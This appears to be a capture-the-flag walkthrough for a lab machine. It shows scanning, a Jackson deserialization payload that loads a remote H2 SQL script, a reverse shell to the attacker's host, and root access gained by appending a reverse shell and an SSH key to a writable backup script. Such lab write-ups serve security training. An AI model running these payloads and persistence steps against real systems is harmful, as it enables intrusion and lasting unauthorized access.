@@ -1,0 +1,93 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.214
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.214
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0f7d97825f042be00a56325d145682d4 (RSA)
+|   256 24ea5349d8cb9bfcd6c426efdd34c11e (ECDSA)
+|_  256 fe2534e43edf9fed622aa49352cccd27 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Online JSON parser
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.214/
+test validated beta
+input: {"ada":"ada"}
+result:
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
+
+some vulnerabilities:
+https://blog.doyensec.com/2019/07/22/jackson-gadgets.html
+
+create test.sql,
+this code:
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+   String[] command = {"bash", "-c", cmd};
+   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+   return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/10.10.16.19/7979 0>&1"')
+
+please input this code on validated beta:
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.16.19:80/test.sql'"}]
+
+command: python -m http.server 80
+command: nc -lvnp 7979
+upgrade shell as usual using python and stty
+
+let's upload linpeas.sh
+take attention:
+-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
+-rw-r--r-- 1 root root 214 Oct 23  2020 /etc/systemd/system/timer_backup.timer
+-rw-r--r-- 1 root root 159 Oct 23  2020 /etc/systemd/system/timer_backup.service
+-rw-r--r-- 1 root root 106 Oct 23  2020 /etc/systemd/system/web_backup.service
+-rwxrw-rw- 1 pericles pericles 88 Jun 24 09:40 /usr/bin/timer_backup.sh
+
+command: cat /etc/systemd/system/timer_backup.service
+result:
+[Unit]
+Description=Calls website backup
+Wants=timer_backup.timer
+WantedBy=multi-user.target
+
+[Service]
+ExecStart=/usr/bin/systemctl restart web_backup.service
+
+command: cat /etc/systemd/system/web_backup.service
+[Unit]
+Description=Creates backups of the website
+
+[Service]
+ExecStart=/bin/bash /usr/bin/timer_backup.sh
+
+command: cat /usr/bin/timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
+
+command: echo -e '\nbash -i >& /dev/tcp/10.10.16.19/4444 0>&1' >> /usr/bin/timer_backup.sh
+command: id && whoami
+command: cat /root/root.txt
+result: 
+00d6ae06bbd715f6b0cb4e8e9053a368
+
+let's put our id_rsa to machine:
+command: 
+echo -e '\nmkdir -p /root/.ssh\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9Ad16VdWJkStlEV+Rvh8v3NfegFnIW3mgi+LoBtvqqa20XusLIMmbP0z7MuwfDjpnEtBo76izt9JJAUvtrfk5mrzaKVmvAXZuOyGUHSPV+vvU8CJvHwiOwg9WbG/0LQJMh6uM+Zg/qoRg0aeGZ8nm2zBVpkU8dAbFPV0ExTgakndH1NA8R34M7H6Oqa4DGwaHp3IjxrVEGU3EjsMe6k5kYDOhmZc3NyzLq1UoNM7y9O4Ne1t5TFrkr9/lFXOd8gxVHJL5bsUY8/GtYqihksLWJdhj2sgs6sax83Qtd8kMXOQW/so6U6jlms+6JeOHf3lxs+vFOq56Gyu4EikqrULdpATlJdiN+D5vY8lpzo93rXN5GjXwQofxcb82oxb2yh6jzf/gUJDox4XI3mQCM9zzkotoOTeN642xNrtMTqx09oGtxVFFAZnxi/zb9rhs/L6P3a1C5pKEyEV9wNDRotGUkXlw0EyTD0oxNE3ADM49sS291aYxL7QdsnRQxi2tEMT1GUkdUmM6y1T0MUnmfoa/5jaEhfIrJaHZlvhP3FlCClqhSxc7460At9ZOkqlibgspeYb3vj/t+9pkTlQj5F+oKV0Nit5tFGYrOAHbjYv6A6NDa7PDrgcM+WE+3zyIecEu4KSfbCuh2OyOpyk73BgHolyuiPweTenUtt5tentb4Q== root@kali.com" >> /root/.ssh/authorized_keys' >> /usr/bin/timer_backup.sh
+command: cat /root/root.txt
+result:
+00d6ae06bbd715f6b0cb4e8e9053a368
+
+resource:
+https://0xdf.gitlab.io/2021/04/03/htb-time.html
